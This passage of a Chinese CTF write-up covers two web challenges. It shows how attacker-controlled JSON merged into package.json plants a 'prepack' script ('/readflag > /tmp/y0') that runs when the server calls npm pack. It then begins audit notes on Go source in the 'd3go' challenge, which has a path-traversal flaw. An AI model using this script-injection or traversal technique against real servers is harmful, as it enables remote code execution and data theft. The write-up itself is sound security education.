&#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Packing dependencies...&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public&quot;</span>);</span><br><span class="line">    cp.<span class="title function_">exec</span>(<span class="string">&quot;cd &quot;</span> + filePath + <span class="string">&quot;&amp;&amp; npm pack &amp;&amp; mv ./*.tgz ./packs&quot;</span>,<span class="function">(<span class="params">err,stdout,stderr</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies error&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies success&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Kill installing dependencies</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/KillDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;You are not admin&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Killing dependencies...&quot;</span>);</span><br><span class="line">    cp.<span class="title function_">exec</span>(<span class="string">&quot;ps -ef | grep npm | grep -v grep | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9&quot;</span>,<span class="function">(<span class="params">err,stdout,stderr</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Kill installing dependencies error&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Kill installing dependencies success&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Logout</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/Logout&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">is_login</span> = <span class="number">0</span>;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">is_admin</span> = <span class="number">0</span>;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后就开始审计代码了，可以看网页上路由的代码了 </p><p><code>// Set dependencies</code>路由</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">all</span>(<span class="string">&quot;/SetDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;You are not admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;You can post the dependencies here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> data = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> data !== <span class="string">&quot;object&quot;</span> &amp;&amp; data === &#123;&#125;)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;plz set the dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">checkFileData</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Invalid dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> exampleJson = &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;app-example&quot;</span>,</span><br><span class="line">            <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Example app for the Node.js Getting Started guide.&quot;</span>,</span><br><span class="line">            <span class="string">&quot;author&quot;</span>: <span class="string">&quot;anonymous&quot;</span>,</span><br><span class="line">            <span class="string">&quot;scripts&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;prepack&quot;</span>: <span class="string">&quot;echo &#x27;packing dependencies&#x27;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;license&quot;</span>: <span class="string">&quot;MIT&quot;</span>,</span><br><span class="line">            <span class="string">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        exampleJson = <span class="title class_">Object</span>.<span class="title function_">assign</span>(exampleJson,&#123;&#125;,data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/package.json&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> fileData = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(exampleJson);</span><br><span class="line"></span><br><span class="line">        fs.<span class="title function_">writeFile</span>(filePath,fileData,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (err)&#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies error&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies success&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里由于这个post值可控，于是data就可控</p><p><img src="../images/image-20230504195748835.png" alt="image-20230504195748835"></p><p><img src="../images/image-20230504195839820.png" alt="image-20230504195839820"></p><p>这段代码定义了一个 JavaScript 对象 <code>exampleJson</code>，表示一个 Node.js 应用程序的 <strong>package.json</strong> 文件内容。这个对象包含了应用程序的名称、版本、描述、作者、脚本、许可证和依赖项等信息。</p><p><code>Object.assign</code> 方法用于将新的属性值合并到现有对象中。这里，我们将空对象 <code>&#123;&#125;</code> 作为第二个参数传递给 <code>Object.assign</code>，因此不会修改现有对象 <code>exampleJson</code>，而是返回一个新对象，该对象包含 <code>exampleJson</code> 的所有属性以及在 <code>data</code> 对象中定义的任何新属性。</p><p>如果 <code>data</code> 对象中定义了与 <code>exampleJson</code> 中相同的属性，则将覆盖原有属性。因此，可以通过 <code>Object.assign</code> 方法来修改或更新现有对象的属性。<strong>在这个例子中，我们使用 <code>Object.assign</code> 来将 <code>data</code> 对象的属性值合并到 <code>exampleJson</code> 对象中，实现了更新 package.json 文件内容的目的。</strong></p><p><code>//PackDependencies</code>路由</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/PackDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;You are not admin&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Packing dependencies...&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public&quot;</span>);</span><br><span class="line">    cp.<span class="title function_">exec</span>(<span class="string">&quot;cd &quot;</span> + filePath + <span class="string">&quot;&amp;&amp; npm pack &amp;&amp; mv ./*.tgz ./packs&quot;</span>,<span class="function">(<span class="params">err,stdout,stderr</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies error&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies success&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里面的有个执行函数，他的意思是</p><p><code>cp.exec(&quot;cd &quot; + filePath + &quot;&amp;&amp; npm pack &amp;&amp; mv ./*.tgz ./packs&quot;,(err,stdout,stderr) =&gt; &#123;</code> <code>npm pack</code>就相当与重新加载里面的json数据会变成我们改变过的，然后exec执行</p><p><img src="../images/image-20230504200640051.png" alt="image-20230504200640051"></p><p>接下来我们就可以使用临时文件来替换这个代码，因为临时目录下文件权限较高</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> exampleJson = </span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;name&quot;</span>: <span class="string">&quot;app-example&quot;</span>,</span><br><span class="line"><span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line"><span class="string">&quot;description&quot;</span>: <span class="string">&quot;Example app for the Node.js Getting Started guide.&quot;</span>,</span><br><span class="line"><span class="string">&quot;author&quot;</span>: <span class="string">&quot;anonymous&quot;</span>,</span><br><span class="line"><span class="string">&quot;scripts&quot;</span>:&#123;</span><br><span class="line"><span class="string">&quot;prepack&quot;</span>: <span class="string">&quot;/readflag &gt; /tmp/y0&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">&quot;license&quot;</span>: <span class="string">&quot;MIT&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后最后通过show路由就可以成功进行文件查看了</p><p><img src="../images/image-20230504201002030.png" alt="image-20230504201002030"></p><p>先去  <code>url/dashboardIndex/SetDependencies</code>  这个网址来进行<strong>package.json</strong>内容的修改</p><p><img src="../images/image-20230504205510103.png" alt="image-20230504205510103"></p><p><strong>这里是别忘改了，不然上传不成功</strong></p><p>然后去<code>url/dashboardIndex/PackDependencies</code>路由进行npm pack 重新加载json数据，然后进行exec数据的执行</p><p><img src="../images/image-20230504202007954.png" alt="image-20230504202007954"></p><p>然后去<code>url/dashboardIndex/ShowExampleFile</code>路由进行文件的读取</p><p><img src="../images/image-20230504205542586.png" alt="image-20230504205542586"></p><p>成功</p><p><strong>这里考察的nosql的MongoDB盲注，app黑名单绕过，nodejs代码审计，npm pack的重新加载</strong></p><p>这道题能学到挺多东西的</p><h2 id="d3go"><a href="#d3go" class="headerlink" title="d3go"></a>d3go</h2><p><strong>bs是go编程语言的新手，最近发现新特性“go embed”很有意思。他写了一个在线解压服务，使用go embed打包静态资源文件。您的任务是利用此应用程序的漏洞，对其进行 RCE 并获取标志。</strong></p><p><strong>一开始会显示ERR_EMPTY_RESPONSE，请稍候刷新！</strong></p><p><strong>提示：</strong></p><p><strong>d3go 的Gamebox 无法连接到Internet。</strong></p><p>题目</p><p><img src="../images/image-20230505192100368.png" alt="image-20230505192100368"></p><p><code>go embed</code> 的错误使用导致源代码被打包到程序中。</p><p>这与不正确的静态文件服务相结合，导致/../路径列表⽬录以获取源代码。</p><p><img src="../images/image-20230505192841822.png" alt="image-20230505192841822"></p><p><strong>main.go</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;crypto/rand&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/config&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/controller&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/db&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/middleware&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/jpillora/overseer&quot;</span></span><br><span class="line">log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">prog</span><span class="params">(state overseer.State)</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">InitRouter(r)</span><br><span class="line">server := http.Server&#123;</span><br><span class="line">Addr:    <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">Handler: r,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := server.Serve(state.Listener); err != <span class="literal">nil</span> &amp;&amp; err != http.ErrServerClosed &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">&lt;-state.GracefulShutdown</span><br><span class="line"><span class="keyword">if</span> err := server.Shutdown(<span class="literal">nil</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">config.Init()</span><br><span class="line">db.Init()</span><br><span class="line"><span class="keyword">if</span> config.Conf.AutoUpdate &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;Auto update enabled&quot;</span>)</span><br><span class="line">err := overseer.RunErr(overseer.Config&#123;</span><br><span class="line">Program: prog,</span><br><span class="line">Address: <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">Fetcher: &amp;config.Fetch,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">InitRouter(r)</span><br><span class="line"><span class="keyword">if</span> err := r.Run(<span class="string">&quot;:8080&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitRouter</span><span class="params">(r *gin.Engine)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> rad [<span class="number">32</span>]<span class="type">byte</span></span><br><span class="line">rand.Read(rad[:])</span><br><span class="line">store := cookie.NewStore(rad[:])</span><br><span class="line">r.Use(sessions.Sessions(<span class="string">&quot;mysession&quot;</span>, store))</span><br><span class="line">r.POST(<span class="string">&quot;/login&quot;</span>, controller.Login)</span><br><span class="line">r.POST(<span class="string">&quot;/register&quot;</span>, controller.Register)</span><br><span class="line">r.GET(<span class="string">&quot;/*filepath&quot;</span>, ServeFile)</span><br><span class="line">r.HEAD(<span class="string">&quot;/*filepath&quot;</span>, ServeFile)</span><br><span class="line">admin := r.Group(<span class="string">&quot;/admin&quot;</span>)</span><br><span class="line">admin.Use(middleware.Auth())</span><br><span class="line">admin.POST(<span class="string">&quot;/upload&quot;</span>, controller.Upload)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ServeFile</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="comment">// unzipped file server</span></span><br><span class="line">p := c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> strings.HasPrefix(p, <span class="string">&quot;/unzipped&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(p) == <span class="number">9</span> &#123;</span><br><span class="line">p = <span class="string">&quot;/&quot;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">p = p[<span class="number">9</span>:]</span><br><span class="line">&#125;</span><br><span class="line">c.FileFromFS(p, http.Dir(<span class="string">&quot;./unzipped&quot;</span>))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// embed static file server</span></span><br><span class="line">p = <span class="string">&quot;/static/&quot;</span> + c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line">c.FileFromFS(p, http.FS(Static))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>config.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> config</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/fsnotify/fsnotify&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/jpillora/overseer/fetcher&quot;</span></span><br><span class="line">log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/spf13/viper&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Conf config</span><br><span class="line"><span class="keyword">var</span> Fetch fetcher.HTTP</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> config <span class="keyword">struct</span> &#123;</span><br><span class="line">NoAdminLogin <span class="type">bool</span></span><br><span class="line">DBUser       <span class="type">string</span></span><br><span class="line">DBPasswd     <span class="type">string</span></span><br><span class="line">DBHost       <span class="type">string</span></span><br><span class="line">DBPort       <span class="type">string</span></span><br><span class="line">AutoUpdate   <span class="type">bool</span></span><br><span class="line">UpdateUrl    <span class="type">string</span></span><br><span class="line">UpdateTime   time.Duration</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Init</span><span class="params">()</span></span> &#123;</span><br><span class="line">viper.SetConfigName(<span class="string">&quot;config&quot;</span>)</span><br><span class="line">viper.SetConfigType(<span class="string">&quot;yaml&quot;</span>)</span><br><span class="line">viper.AddConfigPath(<span class="string">&quot;.&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err := viper.ReadInConfig(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">UpdateConfig()</span><br><span class="line">viper.OnConfigChange(<span class="function"><span class="keyword">func</span><span class="params">(in fsnotify.Event)</span></span> &#123;</span><br><span class="line">UpdateConfig()</span><br><span class="line">&#125;)</span><br><span class="line">viper.WatchConfig()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UpdateConfig</span><span class="params">()</span></span> &#123;</span><br><span class="line">Conf.DBUser = viper.GetString(<span class="string">&quot;database.user&quot;</span>)</span><br><span class="line">Conf.DBPasswd = viper.GetString(<span class="string">&quot;database.password&quot;</span>)</span><br><span class="line">Conf.DBHost = viper.GetString(<span class="string">&quot;database.host&quot;</span>)</span><br><span class="line">Conf.DBPort = viper.GetString(<span class="string">&quot;database.port&quot;</span>)</span><br><span class="line">Conf.NoAdminLogin = viper.GetBool(<span class="string">&quot;server.noAdminLogin&quot;</span>)</span><br><span class="line">Conf.AutoUpdate = viper.GetBool(<span class="string">&quot;update.enabled&quot;</span>)</span><br><span class="line">Fetch = fetcher.HTTP&#123;</span><br><span class="line">URL:      viper.GetString(<span class="string">&quot;update.url&quot;</span>),</span><br><span class="line">Interval: viper.GetDuration(<span class="string">&quot;update.interval&quot;</span>) * time.Second,</span><br><span class="line">&#125;</span><br><span class="line">Fetch.Init()</span><br><span class="line">log.Println(<span class="string">&quot;config updated&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>controller.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 